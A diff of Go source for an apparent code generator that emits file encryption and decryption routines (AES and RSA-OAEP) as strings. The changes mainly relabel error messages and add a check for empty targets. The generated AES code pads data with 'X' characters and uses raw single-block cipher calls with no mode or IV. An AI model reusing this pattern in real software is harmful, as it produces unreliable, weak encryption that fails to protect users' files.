@@ -26,11 +26,11 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"notify.Error(\"Method, target or/and key has not been set for encryption\", \"runtime.Error()\")",
 		"}",
 		"for _, target := range spine.crypt.target{",
-
 		"target = spine.variable.get(target)",
 		"gut, err := ioutil.ReadFile(target)",
 
 		"if err != nil{",
+		"notify.Error(err.Error(), \"Encrypt.Error()\")",
 		"return",
 		"}",
 		"enc := \"\"",
@@ -40,7 +40,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"aes\":",
 		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
 		"if err != nil{",
-		"notify.Error(err.Error(), \"runtime.Error()\")",
+		"notify.Error(err.Error(), \"Encrypt.Error()\")",
 		"}",
 		"for (len(gut) < spine.crypt.aes_key_length){",
 		"gut = append(gut, []byte(\"X\")...)",
@@ -52,7 +52,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"rsa\":",
 		"enc_byte, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &spine.crypt.rsa_public, []byte(gut), nil)",
 		"if err != nil{",
-		"notify.Error(err.Error(), \"runtime.Error()\")",
+		"notify.Error(err.Error(), \"Encrypt.Error()\")",
 		"}",
 		"enc = hex.EncodeToString(enc_byte)",
 		"}",
@@ -207,7 +207,9 @@ func add_target(value string, s_json string) ([]string, string) {
 		fmt.Sprintf("func %s(repr []int){", system_call),
 		"target := spine.alpha.construct_string(repr)",
 		"target = spine.variable.get(target)",
+		"if target != \"\"{",
 		"spine.crypt.add_target(target)",
+		"}",
 		"}"})
 
 	// Construct our int array
@@ -270,6 +272,7 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"gut, err := ioutil.ReadFile(target)",
 
 		"if err != nil{",
+		"notify.Error(err.Error(), \"Decrypt.Error()\")",
 		"return",
 		"}",
 		"dec := \"\"",
@@ -279,11 +282,11 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"aes\":",
 		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
 		"if err != nil{",
-		"notify.Error(err.Error(), \"runtime.Error()\")",
+		"notify.Error(err.Error(), \"Decrypt.Error()\")",
 		"}",
 		"cipher_text, err := hex.DecodeString(string(gut[:]))",
 		"if err != nil{",
-		"notify.Error(err.Error(), \"runtime.Error()\")",
+		"notify.Error(err.Error(), \"Decrypt.Error()\")",
 		"}",
 		"buffer := make([]byte, len(cipher_text))",
 		"cipher.Decrypt(buffer, []byte(cipher_text))",
@@ -292,12 +295,12 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"rsa\":",
 		"buffer, err := hex.DecodeString(string(gut[:]))",
 		"if err != nil{",
-		"notify.Error(err.Error(), \"runtime.Error()\")",
+		"notify.Error(err.Error(), \"Decrypt.Error()\")",
 		"}",
 
 		"buffer, err = spine.crypt.rsa_private.Decrypt(nil, buffer, &rsa.OAEPOptions{Hash: crypto.SHA256})",
 		"if err != nil{",
-		"notify.Error(err.Error(), \"runtime.Error()\")",
+		"notify.Error(err.Error(), \"Decrypt.Error()\")",
 		"}",
 
 		"dec = string(buffer[:])",
